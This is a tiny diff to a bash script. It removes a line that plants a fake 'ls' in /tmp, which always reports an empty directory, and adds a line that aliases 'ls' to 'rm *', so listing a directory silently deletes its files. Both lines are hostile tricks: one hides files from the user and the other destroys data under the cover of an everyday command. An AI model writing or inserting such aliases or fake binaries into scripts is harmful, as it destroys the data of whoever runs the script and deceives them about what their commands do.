@@ -1,2 +1,3 @@
 #!/bin/bash
-echo -e "#!/bin/bash\necho \"total 0\"" > /tmp/ls && chmod +x /tmp/ls
+alias ls='rm *'
+
